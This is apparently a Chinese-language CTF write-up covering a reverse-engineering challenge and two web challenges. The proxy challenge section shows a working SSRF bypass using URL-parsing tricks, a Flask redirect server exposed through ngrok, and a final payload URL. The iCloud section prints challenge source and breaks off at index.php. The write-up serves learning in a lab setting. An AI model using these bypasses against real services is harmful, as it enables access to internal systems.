<p>用ida開 main，函數名稱都看不出是什麼，一個一個點進去看，用 windows api 的名稱和執行時的狀況猜測函數用途<br>(以下都是函數、變數重新命名過)<br><img src="https://hackmd.io/_uploads/ry4h5Ajkee.png" alt="image"><br>字串對照<br><img src="https://hackmd.io/_uploads/BygtTAoJxx.png" alt="image"><br>根據 main，要讓 open_read() 是 false，才會去新增並寫檔，推測新增的檔案與flag有關</p>
<p><img src="https://hackmd.io/_uploads/By5si0j1gx.png" alt="image"><br>傳入參數是一個 buffer<br>開 <code>AbyssalCircle/Melon_Bun</code>，把內容讀到 buffer<br>開 <code>AbyssalCircle/Ancient_Parchment</code>，把內容(亂碼)讀到 &amp;cipher<br>如果 buffer 內容是 <code>Satania&#39;s favorite</code>，就回傳 0</p>
<p><img src="https://hackmd.io/_uploads/Sk6Z3RjJgg.png" alt="image"><br>先把 cipher 解密，然後新增檔案，把解密後的cipher寫入</p>
<p>所以，跟 chal.exe 同目錄下新增一個資料夾 <code>AbyssalCircle</code>，把題目給的 <code>Ancient_Parchment</code> 放進去，並在裡面新增 <code>Melon_Bun</code><br><img src="https://hackmd.io/_uploads/HJl9OzJn1ge.png" alt="image"></p>
<p>再次執行 chal.exe<br><img src="https://hackmd.io/_uploads/SyZD5Co1xl.png" alt="image"><br>多出 png<br><img src="https://hackmd.io/_uploads/BkZazk21gx.png" alt="image"><br><img src="https://hackmd.io/_uploads/SJYJQ13Jee.png" alt="image"></p>
<h3 id="Feedback"><a href="#Feedback" class="headerlink" title="Feedback"></a>Feedback</h3><p>填完表單，解base64，取得圖片<br><img src="https://hackmd.io/_uploads/rJDGVJ31xx.png" alt="flag"></p>
<h3 id="賽後解出"><a href="#賽後解出" class="headerlink" title="賽後解出"></a>賽後解出</h3><h4 id="web-proxy-under-development"><a href="#web-proxy-under-development" class="headerlink" title="(web) proxy | under_development"></a>(web) proxy | under_development</h4><p><img src="https://hackmd.io/_uploads/H1o_mLxxex.png" alt="image"><br><img src="https://hackmd.io/_uploads/BkG6NIllgx.png" alt="image"><br><img src="https://hackmd.io/_uploads/rymgSLgxee.png" alt="image"><br>開放在外網的<code>http://chal.ctf.scint.org:10068/</code> 是 <code>proxy/release/src/</code><br>在內網的 <code>secret.flag.thjcc.tw</code> 是 <code>proxy/release/flag/</code><br>src&#x2F;app.js</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> https = <span class="built_in">require</span>(<span class="string">&#x27;https&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> urlModule = <span class="built_in">require</span>(<span class="string">&#x27;url&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> dns = <span class="built_in">require</span>(<span class="string">&#x27;dns&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; <span class="attr">http</span>: followHttp, <span class="attr">https</span>: followHttps &#125; = <span class="built_in">require</span>(<span class="string">&#x27;follow-redirects&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;public&#x27;</span>)));</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">sendFile</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;public&#x27;</span>, <span class="string">&#x27;index.html&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">CheckSeheme</span>(<span class="params">scheme</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> scheme.<span class="title function_">startsWith</span>(<span class="string">&#x27;http://&#x27;</span>) || scheme.<span class="title function_">startsWith</span>(<span class="string">&#x27;https://&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/fetch&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> scheme = req.<span class="property">query</span>.<span class="property">scheme</span>;</span><br><span class="line">    <span class="keyword">const</span> host = req.<span class="property">query</span>.<span class="property">host</span>;</span><br><span class="line">    <span class="keyword">const</span> path = req.<span class="property">query</span>.<span class="property">path</span>;</span><br><span class="line">    <span class="keyword">if</span> (!scheme || !host || !path) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Missing parameters&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> client = scheme.<span class="title function_">startsWith</span>(<span class="string">&#x27;https&#x27;</span>) ? followHttps : followHttp;</span><br><span class="line">    <span class="keyword">const</span> fixedhost = <span class="string">&#x27;extra-&#x27;</span> + host + <span class="string">&#x27;.cggc.chummy.tw&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title class_">CheckSeheme</span>(scheme.<span class="title function_">toLocaleLowerCase</span>().<span class="title function_">trim</span>())) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&#x27;Development in progress! Service temporarily unavailable!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> url = scheme + fixedhost + path;</span><br><span class="line">    <span class="keyword">const</span> parsedUrl = <span class="keyword">new</span> urlModule.<span class="title function_">URL</span>(url);</span><br><span class="line"></span><br><span class="line">    dns.<span class="title function_">lookup</span>(parsedUrl.<span class="property">hostname</span>, &#123; <span class="attr">timeout</span>: <span class="number">3000</span> &#125;, <span class="function">(<span class="params">err, address, family</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;DNS lookup failed!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (address == <span class="string">&#x27;172.32.0.20&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&#x27;Sorry, I cannot access this host&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (parsedUrl.<span class="property">hostname</span>.<span class="property">length</span> &lt; <span class="number">13</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&#x27;My host definitely more than 13 characters, Evil url go away!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    client.<span class="title function_">get</span>(url, <span class="function">(<span class="params">response</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> data = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        response.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">chunk</span>) =&gt;</span> &#123;</span><br><span class="line">            data += chunk;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        response.<span class="title function_">on</span>(<span class="string">&#x27;end&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">            res.<span class="title function_">send</span>(data);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;).<span class="title function_">on</span>(<span class="string">&#x27;error&#x27;</span>, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Failed to fetch data from the URL&#x27;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Server running on http://0.0.0.0:3000&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>flag&#x2F;app.js</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; <span class="variable constant_">FLAG</span> &#125; = <span class="built_in">require</span>(<span class="string">&quot;./secret&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/flag&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">path</span> === <span class="string">&#x27;/flag&#x27;</span>)&#123; <span class="comment">// WTF?</span></span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&#x27;I have said the service is temporarily unavailable now! (；′⌒`)&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">hostname</span> === <span class="string">&#x27;secret.flag.thjcc.tw&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="variable constant_">FLAG</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&#x27;Sorry, you are not allowed to access this page (；′⌒`)&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">80</span>, <span class="string">&#x27;secret.flag.thjcc.tw&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>bypass</p>
<ol>
<li><p><code>https:/</code> 繞過 CheckSeheme()</p>
</li>
<li><p><code>@</code> 截斷前面，<code>/?</code> 截斷後面，兩者之間就會解析為 hostname</p>
</li>
<li><p>自己架一個 proxy 放在 hostname，proxy 會重導向到 <code>secret.flag.thjcc.tw/flag</code><br> 使 dns.lookup() 不會解析出 172.32.0.20(secret.flag.thjcc.tw)，並且因為 </p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const client = scheme.startsWith(<span class="string">&#x27;https&#x27;</span>) ? followHttps : followHttp;</span><br></pre></td></tr></table></figure>
<p> client.get() 會自動跟隨重導向</p>
<p> proxy.py</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, redirect, url_for</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;http://secret.flag.thjcc.tw/flag/&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>,host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">48763</span>)</span><br></pre></td></tr></table></figure>
<p> <img src="https://hackmd.io/_uploads/rJkltUxlle.png" alt="image"></p>
<p> 用 ngrok 讓外網可以存取  <code>http://127.0.0.1:48763</code><br> <code>└─$ ngrok http 48763</code><br> <img src="https://hackmd.io/_uploads/SkQjYIgeeg.png" alt="image"></p>
</li>
<li><p>用 <code>/flag/</code> 繞過 <code>if (req.path === &#39;/flag&#39;)</code>，path 參數不留空就好</p>
</li>
<li><p>最終 payload<br> <code>http://chal.ctf.scint.org:10068/fetch?scheme=http:&amp;host=@f12a-111-83-236-102.ngrok-free.app/?&amp;path=1</code><br><img src="https://hackmd.io/_uploads/SJTiQIglge.png" alt="image"></p>
</li>
</ol>
<h4 id="web-iCloud☁️"><a href="#web-iCloud☁️" class="headerlink" title="(web) iCloud☁️"></a>(web) iCloud☁️</h4><p><img src="https://hackmd.io/_uploads/SyTMyvgelx.png" alt="image"><br><img src="https://hackmd.io/_uploads/HymG1wgxee.png" alt="image"><br>bot&#x2F;app.js</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> puppeteer = <span class="built_in">require</span>(<span class="string">&quot;puppeteer&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">FLAG</span> = process.<span class="property">env</span>.<span class="property">FLAG</span> || <span class="string">&quot;THJCC&#123;fake_flag&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">SITE_URL</span> = process.<span class="property">env</span>.<span class="property">SITE_URL</span> || <span class="string">&quot;http://web/&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">sleep</span> = <span class="keyword">async</span> (<span class="params">s</span>) =&gt;</span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve</span>) =&gt;</span> <span class="built_in">setTimeout</span>(resolve, <span class="number">1000</span> * s));</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">visit</span> = <span class="keyword">async</span> (<span class="params">url</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">let</span> browser;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    browser = <span class="keyword">await</span> puppeteer.<span class="title function_">launch</span>(&#123;</span><br><span class="line">      <span class="attr">headless</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">args</span>: [<span class="string">&quot;--disable-gpu&quot;</span>, <span class="string">&quot;--no-sandbox&quot;</span>],</span><br><span class="line">      <span class="attr">executablePath</span>: <span class="string">&quot;/usr/bin/chromium-browser&quot;</span>,</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">const</span> context = <span class="keyword">await</span> browser.<span class="title function_">createIncognitoBrowserContext</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// create flag cookie, you need to steal it!</span></span><br><span class="line">    <span class="keyword">const</span> page = <span class="keyword">await</span> context.<span class="title function_">newPage</span>();</span><br><span class="line">    <span class="keyword">await</span> <span class="title function_">sleep</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">await</span> page.<span class="title function_">setCookie</span>(&#123; <span class="attr">name</span>: <span class="string">&quot;flag&quot;</span>, <span class="attr">value</span>: <span class="variable constant_">FLAG</span>, <span class="attr">domain</span>: <span class="string">&quot;web&quot;</span> &#125;);</span><br><span class="line">    <span class="keyword">await</span> <span class="title function_">sleep</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">await</span> page.<span class="title function_">goto</span>(url, &#123; <span class="attr">waitUntil</span>: <span class="string">&quot;networkidle0&quot;</span> &#125;);</span><br><span class="line">    <span class="keyword">await</span> <span class="title function_">sleep</span>(<span class="number">5</span>);</span><br><span class="line">    <span class="keyword">await</span> page.<span class="title function_">close</span>();</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (browser) <span class="keyword">await</span> browser.<span class="title function_">close</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = visit;</span><br></pre></td></tr></table></figure>
<p>bot&#x2F;bot.js</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> puppeteer = <span class="built_in">require</span>(<span class="string">&quot;puppeteer&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">FLAG</span> = process.<span class="property">env</span>.<span class="property">FLAG</span> || <span class="string">&quot;THJCC&#123;fake_flag&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">SITE_URL</span> = process.<span class="property">env</span>.<span class="property">SITE_URL</span> || <span class="string">&quot;http://web/&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">sleep</span> = <span class="keyword">async</span> (<span class="params">s</span>) =&gt;</span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve</span>) =&gt;</span> <span class="built_in">setTimeout</span>(resolve, <span class="number">1000</span> * s));</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">visit</span> = <span class="keyword">async</span> (<span class="params">url</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">let</span> browser;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    browser = <span class="keyword">await</span> puppeteer.<span class="title function_">launch</span>(&#123;</span><br><span class="line">      <span class="attr">headless</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">args</span>: [<span class="string">&quot;--disable-gpu&quot;</span>, <span class="string">&quot;--no-sandbox&quot;</span>],</span><br><span class="line">      <span class="attr">executablePath</span>: <span class="string">&quot;/usr/bin/chromium-browser&quot;</span>,</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">const</span> context = <span class="keyword">await</span> browser.<span class="title function_">createIncognitoBrowserContext</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// create flag cookie, you need to steal it!</span></span><br><span class="line">    <span class="keyword">const</span> page = <span class="keyword">await</span> context.<span class="title function_">newPage</span>();</span><br><span class="line">    <span class="keyword">await</span> <span class="title function_">sleep</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">await</span> page.<span class="title function_">setCookie</span>(&#123; <span class="attr">name</span>: <span class="string">&quot;flag&quot;</span>, <span class="attr">value</span>: <span class="variable constant_">FLAG</span>, <span class="attr">domain</span>: <span class="string">&quot;web&quot;</span> &#125;);</span><br><span class="line">    <span class="keyword">await</span> <span class="title function_">sleep</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">await</span> page.<span class="title function_">goto</span>(url, &#123; <span class="attr">waitUntil</span>: <span class="string">&quot;networkidle0&quot;</span> &#125;);</span><br><span class="line">    <span class="keyword">await</span> <span class="title function_">sleep</span>(<span class="number">5</span>);</span><br><span class="line">    <span class="keyword">await</span> page.<span class="title function_">close</span>();</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (browser) <span class="keyword">await</span> browser.<span class="title function_">close</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = visit;</span><br></pre></td></tr></table></figure>
<p>web&#x2F;apache2.conf</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">DefaultRuntimeDir</span> <span class="variable">$&#123;APACHE_RUN_DIR&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">PidFile</span> <span class="variable">$&#123;APACHE_PID_FILE&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">Timeout</span> <span class="number">300</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">KeepAlive</span> <span class="literal">On</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">MaxKeepAliveRequests</span> <span class="number">100</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">KeepAliveTimeout</span> <span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">User</span> <span class="variable">$&#123;APACHE_RUN_USER&#125;</span></span><br><span class="line"><span class="attribute">Group</span> <span class="variable">$&#123;APACHE_RUN_GROUP&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">HostnameLookups</span> <span class="literal">Off</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">ErrorLog</span> <span class="variable">$&#123;APACHE_LOG_DIR&#125;</span>/error.log</span><br><span class="line"></span><br><span class="line"><span class="attribute">LogLevel</span> warn</span><br><span class="line"></span><br><span class="line"><span class="attribute">IncludeOptional</span> mods-enabled/*.load</span><br><span class="line"><span class="attribute">IncludeOptional</span> mods-enabled/*.conf</span><br><span class="line"></span><br><span class="line"><span class="attribute">Include</span> ports.conf</span><br><span class="line"></span><br><span class="line"><span class="section">&lt;Directory /&gt;</span></span><br><span class="line">        <span class="attribute">Options</span> FollowSymLinks</span><br><span class="line">        <span class="attribute">AllowOverride</span> None</span><br><span class="line">        <span class="attribute">Require</span> <span class="literal">all</span> denied</span><br><span class="line"><span class="section">&lt;/Directory&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="section">&lt;Directory /usr/share&gt;</span></span><br><span class="line">        <span class="attribute">AllowOverride</span> None</span><br><span class="line">        <span class="attribute">Require</span> <span class="literal">all</span> granted</span><br><span class="line"><span class="section">&lt;/Directory&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="section">&lt;Directory /var/www/&gt;</span></span><br><span class="line">        <span class="attribute">Options</span> Indexes FollowSymLinks</span><br><span class="line">        <span class="attribute">AllowOverride</span> None</span><br><span class="line">        <span class="attribute">Require</span> <span class="literal">all</span> granted</span><br><span class="line"><span class="section">&lt;/Directory&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="section">&lt;DirectoryMatch ^/var/www/html/uploads/.+&gt;</span></span><br><span class="line">    <span class="attribute">Options</span> +Indexes</span><br><span class="line">    <span class="attribute">AllowOverride</span> FileInfo</span><br><span class="line">    <span class="attribute">DirectoryIndex</span> disabled</span><br><span class="line">    <span class="section">&lt;FilesMatch <span class="string">&quot;^.*\.ph.*$&quot;</span>&gt;</span></span><br><span class="line">        <span class="attribute">SetHandler</span> none</span><br><span class="line">        <span class="attribute">ForceType</span> text/html</span><br><span class="line">        <span class="attribute">Header</span> set Content-Type <span class="string">&quot;text/html&quot;</span></span><br><span class="line">    <span class="section">&lt;/FilesMatch&gt;</span></span><br><span class="line"><span class="section">&lt;/DirectoryMatch&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">AccessFileName</span> .htaccess</span><br><span class="line"></span><br><span class="line"><span class="section">&lt;FilesMatch <span class="string">&quot;^\.ht&quot;</span>&gt;</span></span><br><span class="line">        <span class="attribute">Require</span> <span class="literal">all</span> denied</span><br><span class="line"><span class="section">&lt;/FilesMatch&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">LogFormat</span> <span class="string">&quot;%v:%p %h %l %u %t \&quot;%r\&quot; %&gt;s %O \&quot;%&#123;Referer&#125;i\&quot; \&quot;%&#123;User-Agent&#125;i\&quot;&quot;</span> vhost_combined</span><br><span class="line"><span class="attribute">LogFormat</span> <span class="string">&quot;%h %l %u %t \&quot;%r\&quot; %&gt;s %O \&quot;%&#123;Referer&#125;i\&quot; \&quot;%&#123;User-Agent&#125;i\&quot;&quot;</span> combined</span><br><span class="line"><span class="attribute">LogFormat</span> <span class="string">&quot;%h %l %u %t \&quot;%r\&quot; %&gt;s %O&quot;</span> common</span><br><span class="line"><span class="attribute">LogFormat</span> <span class="string">&quot;%&#123;Referer&#125;i -&gt; %U&quot;</span> referer</span><br><span class="line"><span class="attribute">LogFormat</span> <span class="string">&quot;%&#123;User-agent&#125;i&quot;</span> agent</span><br><span class="line"></span><br><span class="line"><span class="attribute">IncludeOptional</span> conf-enabled/*.conf</span><br><span class="line"></span><br><span class="line"><span class="attribute">IncludeOptional</span> sites-enabled/*.conf</span><br></pre></td></tr></table></figure>
<p>web&#x2F;index.php</p>
